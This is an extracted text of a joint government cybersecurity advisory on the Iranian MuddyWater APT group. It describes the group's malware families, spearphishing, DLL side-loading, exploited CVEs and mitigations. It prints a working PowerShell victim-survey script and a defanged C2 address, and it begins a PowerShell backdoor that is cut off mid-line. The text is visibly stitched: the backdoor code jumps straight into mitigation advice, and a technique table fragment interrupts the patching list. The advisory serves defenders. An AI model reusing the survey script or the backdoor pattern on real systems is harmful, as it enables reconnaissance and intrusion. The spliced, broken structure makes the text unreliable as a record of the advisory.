These\nactors also maintain persistence on victim networks via tactics such as side-loading dynamic link\nlibraries (DLLs)—to trick legitimate programs into running malware—and obfuscating PowerShell\nscripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed\nMuddyWater actors recently using various malware—variants of PowGoop, Small Sieve, Canopy\n(also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their\nmalicious activity.\n\nThis advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators\nof compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid\norganizations in the identification of malicious activity against sensitive networks.\n\nFBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations\napply the mitigations in this advisory and review the following resources for additional information.\n**Note: also see the Additional Resources section.**\n\n     - Malware Analysis Report – [MAR-10369127.r1.v1: MuddyWater](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a)\n\n     - [IOCs – AA22-055A.stix and MAR-10369127.r1.v1.stix](https://www.cisa.gov/uscert/sites/default/files/publications/AA22-055A.stix.xml)\n\n     - [CISA's webpage – Iran Cyber Threat Overview and Advisories](https://www.us-cert.cisa.gov/iran)\n\n     - [NCSC-UK MAR – Small Sieve](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf)\n\n     - [CNMF's press release – Iranian intel cyber suite of malware uses open source tools](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\n\n## TECHNICAL DETAILS\n\nFBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater\nAPT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple\nopen-source tools to gain access to sensitive government and commercial networks.\n\nAs part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into\ndownloading ZIP files, containing either an Excel file with a malicious macro that communicates with\nthe actor’s C2 server or a PDF file that drops a malicious file to the victim’s network [[T1566.001,](https://attack.mitre.org/versions/v10/techniques/T1566/001/)\n[T1204.002]. MuddyWater actors also use techniques such as side-loading DLLs [T1574.002] to trick](https://attack.mitre.org/versions/v10/techniques/T1204/002)\n[legitimate programs into running malware and obfuscating PowerShell scripts [T1059.001] to hide C2](https://attack.mitre.org/versions/v10/techniques/T1059/001/)\n[functions [T1027] (see the PowGoop section for more information).](https://attack.mitre.org/versions/v10/techniques/T1027/)\n\nAdditionally, the group uses multiple malware sets—including PowGoop, Small Sieve,\nCanopy/Starwhale, Mori, and POWERSTATS—for loading malware, backdoor access, persistence\n\n[[TA0003], and exfiltration [TA0010]. See below for descriptions of some of these malware sets,](https://attack.mitre.org/versions/v10/tactics/TA0003/)\nincluding newer tools or variants to the group’s suite. Additionally, see Malware Analysis Report [MAR-](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a)\n[10369127.r1.v1: MuddyWater](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a) for further details.\n\n### PowGoop\n\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\n\n-----\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\nMuddyWater actors use new variants of PowGoop malware as their main loader in malicious\noperations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file\nimpersonates a legitimate file that is signed as a Google Update executable file.\n\n[According to samples of PowGoop analyzed by CISA](https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-055a) [and CNMF, PowGoop consists of three](https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/)\ncomponents:\n\n     - A DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading\n[technique [T1574.002]. The DLL file is contained within an executable, GoogleUpdate.exe.](https://attack.mitre.org/versions/v10/techniques/T1574/002/)\n\n     - A PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a\n[second obfuscated PowerShell script, config.txt [T1059.001].](https://attack.mitre.org/versions/v10/techniques/T1059/001/)\n\n     - `config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded`\nIP address.\n\nThese components retrieve encrypted commands from a C2 server. The DLL file hides\ncommunications with MuddyWater C2 servers by executing with the Google Update service.\n\n### Small Sieve\n\n[According to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor](https://www.ncsc.gov.uk/files/NCSC-Malware-Analysis-Report-Small-Sieve.pdf)\ndistributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS\n[installs the Python backdoor, index.exe, and adds it as a registry run key [T1547.001], enabling](https://attack.mitre.org/versions/v10/techniques/T1547/001/)\n[persistence [TA0003].](https://attack.mitre.org/versions/v10/tactics/TA0003/)\n\nMuddyWater disguises malicious executables and uses filenames and Registry key names\nassociated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT\ngroup has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated\n[with Small Sieve [T1036.005].](https://attack.mitre.org/versions/v10/techniques/T1036/005/)\n\nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim\n[infrastructure and avoid detection [TA0005] by using custom string and traffic obfuscation schemes](https://attack.mitre.org/versions/v10/tactics/TA0005/)\ntogether with the Telegram Bot application programming interface (API). Specifically, Small Sieve’s\nbeacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure\n[(HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a hex byte](https://attack.mitre.org/versions/v10/techniques/T1071/001)\n[swapping encoding scheme combined with an obfuscated Base64 function [T1027], T1132.002].](https://attack.mitre.org/versions/v10/techniques/T1027)\n\n**Note: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to**\nMuddyWater with high confidence.\n\nSee Appendix B for further analysis of Small Sieve malware.\n\n### Canopy\n\nMuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with\n[targeted attachments [T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA,](https://attack.mitre.org/versions/v10/techniques/T1566/001)\nCanopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the\ncybersecurity agencies of the United Kingdom and the United States attribute these malware samples\nto MuddyWater with high confidence.\n\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\n\n-----\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\nIn the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros\nwritten in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim\n[opens the Excel file, they receive a prompt to enable macros [T1204.002]. Once this occurs, the](https://attack.mitre.org/versions/v10/techniques/T1204/002/)\nmacros are executed, decoding and installing the two embedded Windows Script Files.\n\n[The first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file](https://attack.mitre.org/versions/v10/techniques/T1547/001/)\n[contains hexadecimal (hex)-encoded strings that have been reshuffled [T1027]. The file executes a](https://attack.mitre.org/versions/v10/techniques/T1027/)\ncommand to run the second .wsf.\n\nThe second .wsf also contains hex-encoded strings that have been reshuffled. This file collects\n\n[[TA0035] the victim system’s IP address, computer name, and username [T1005]. The collected data](https://attack.mitre.org/versions/v10/tactics/TA0035/)\nis then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124,\n[via an HTTP POST request [T1041].](https://attack.mitre.org/versions/v10/techniques/T1041/)\n\n### Mori\n\nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate\n[with the group’s C2 infrastructure [T1572].](https://attack.mitre.org/versions/v10/techniques/T1572/)\n\nAccording to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is\nexecuted with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component\n[to another program. FML.dll contains approximately 200MB of junk data [T1001.001] in a resource](https://attack.mitre.org/versions/v10/techniques/T1001/001/)\ndirectory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs\nthe following tasks:\n\n   - Deletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with\na .old extension.\n\n   - Resolves networking APIs from strings that are ADD-encrypted with the key 0x05.\n\n   - Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the\nJSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their\nresults.\n\n   - Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified\n[flag, for C2 [T1071.001].](https://attack.mitre.org/versions/v10/techniques/T1071/001/)\n\n   - Reads and/or writes data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and\n```\n    HKLM\\Software\\NFC\\(Default).\n\n### POWERSTATS\n\n```\nThis group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to\n[maintain persistent access to the victim systems [T1059.001].](https://attack.mitre.org/versions/v10/techniques/T1059)\n\nCNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools—\nalong with JavaScript files used to establish connections back to malicious infrastructure—to the\n[malware aggregation tool and repository, Virus Total. Network operators who identify multiple](http://www.virustotal.com/en/user/CYBERCOM_Malware_Alert)\ninstances of the tools on the same network should investigate further as this may indicate the\npresence of an Iranian malicious cyber actor.\n\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\n\n-----\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\nMuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted\noperations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the\n[Microsoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)\n[memory corruption vulnerability (CVE-2020-0688). See CISA’s Known Exploited Vulnerabilities](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688)\n[Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: [Iranian](https://www.cisa.gov/uscert/ncas/alerts/aa21-321a)\n[Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities](https://www.cisa.gov/uscert/ncas/alerts/aa21-321a)\nfor additional Iranian APT group-specific vulnerability exploits.\n\n### Survey Script\n\nThe following script is an example of a survey script used by MuddyWater to enumerate information\nabout victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain\ninformation about the compromised machine to generate a string, with these fields separated by a\ndelimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant\nand sent to an adversary-controlled IP address.\n```\n   $O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += \";;\";$ips = \"\";Get   WmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips =\n   $ips + \", \" + $_.IPAddress[0]};$S += $ips.substring(1);$S += \";;\";$S +=\n   $O.OSArchitecture;$S += \";;\";$S +=\n   [System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get-WmiObject\n   Win32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S +=\n   \";;\";$AntiVirusProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class\n   AntiVirusProduct -ComputerName $env:computername;$resAnti =\n   @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti +=\n   $AntiVirusProduct.displayName};$S += $resAnti;echo $S;\n\n### Newly Identified PowerShell Backdoor\n\n```\nThe newly identified PowerShell backdoor used by MuddyWater below uses a single-byte ExclusiveOR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The\nscript is lightweight in functionality and uses the InvokeScript method to execute responses received\nfrom the adversary.\n```\n   function encode($txt,$key){$enByte =\n

Email attachments and files downloaded via links in emails often contain**\nexecutable code.\n\n### Identity and Access Management\n\n   - **Use multifactor authentication where possible, particularly for webmail, virtual private**\nnetworks, and accounts that access critical systems.\n\n   - **Limit the use of administrator privileges. Users who browse the internet, use email, and**\nexecute code with administrator privileges make for excellent spearphishing targets because their\nsystem—once infected—enables attackers to move laterally across the network, gain additional\naccesses, and access highly sensitive information.\n\n### Phishing Protection\n\n   - **Enable antivirus and anti-malware software and update signature definitions in a timely**\n**manner. Well-maintained antivirus software may prevent use of commonly deployed attacker**\ntools that are delivered via spearphishing.\n\n   - **Be suspicious of unsolicited contact via email or social media from any individual you do**\n**not know personally. Do not click on hyperlinks or open attachments in these communications.**\n\n   - **Consider adding an email banner to emails received from outside your organization and**\n**disabling hyperlinks in received emails.**\n\n   - **Train users through awareness and simulations to recognize and report phishing and**\n**social engineering attempts. Identify and suspend access of user accounts exhibiting unusual**\nactivity.\n\n   - **Adopt threat reputation services at the network device, operating system, application, and**\n**email service levels. Reputation services can be used to detect or prevent low-reputation email**\naddresses, files, URLs, and IP addresses used in spearphishing attacks.\n\n### Vulnerability and Configuration Management\n\n|Remote Access Software|T1219|MuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally.|\n|---|---|---|\n|Exfiltration|||\n|Exfiltration Over C2 Channel|T1041|MuddyWater has used C2 infrastructure to receive exfiltrated data.|\n\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\n\n-----\n\n**TLP:WHITE** FBI | CISA | CNMF | NCSC-UK | NSA\n\n   - **Install updates/patch operating systems, software, and firmware as soon as**\n**updates/patches are released.
